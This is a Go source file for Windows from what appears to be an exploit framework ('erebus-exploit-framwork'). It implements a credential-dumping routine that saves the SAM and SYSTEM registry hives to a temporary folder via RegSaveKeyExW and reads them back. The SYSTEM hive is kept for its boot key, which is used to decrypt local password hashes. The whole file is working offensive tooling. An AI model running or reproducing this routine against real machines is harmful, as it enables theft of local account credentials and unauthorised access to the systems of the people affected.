//go:build windows

package creds

import (
	"context"
	"fmt"
	"os"
	"path/filepath"
	"unsafe"

	pb "github.com/KKingZero/erebus-exploit-framwork/pkg/pb"
	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

func dumpSAM(_ context.Context, _ *pb.CredDumpConfig) (*pb.CredDumpResult, error) {
	tmpDir, err := os.MkdirTemp("", "reg-")
	if err != nil {
		return nil, fmt.Errorf("create temp dir: %w", err)
	}
	defer os.RemoveAll(tmpDir)

	samPath := filepath.Join(tmpDir, "SAM")
	sysPath := filepath.Join(tmpDir, "SYSTEM")

	// Save SAM hive
	if err := saveRegHive(registry.LOCAL_MACHINE, `SAM`, samPath); err != nil {
		return nil, fmt.Errorf("save SAM: %w", err)
	}

	// Save SYSTEM hive (needed for boot key)
	if err := saveRegHive(registry.LOCAL_MACHINE, `SYSTEM`, sysPath); err != nil {
		return nil, fmt.Errorf("save SYSTEM: %w", err)
	}

	samData, _ := os.ReadFile(samPath)
	sysData, _ := os.ReadFile(sysPath)

	return &pb.CredDumpResult{
		Method: "sam",
		Credentials: []*pb.Credential{
			{
				Type:   "registry_hive",
				Source: "SAM",
				Value:  fmt.Sprintf("SAM hive: %d bytes", len(samData)),
			},
			{
				Type:   "registry_hive",
				Source: "SYSTEM",
				Value:  fmt.Sprintf("SYSTEM hive: %d bytes", len(sysData)),
			},
		},
	}, nil
}

func saveRegHive(root registry.Key, subkey, path string) error {
	advapi32 := windows.NewLazyDLL("advapi32.dll")
	procRegSaveKeyExW := advapi32.NewProc("RegSaveKeyExW")

	key, err := registry.OpenKey(root, subkey, registry.READ)
	if err != nil {
		return err
	}
	defer key.Close()

	pathUTF16, _ := windows.UTF16PtrFromString(path)
	ret, _, err := procRegSaveKeyExW.Call(
		uintptr(key),
		uintptr(unsafe.Pointer(pathUTF16)),
		0,
		2, // REG_LATEST_FORMAT
	)
	if ret != 0 {
		return fmt.Errorf("RegSaveKeyExW: %w", err)
	}
	return nil
}
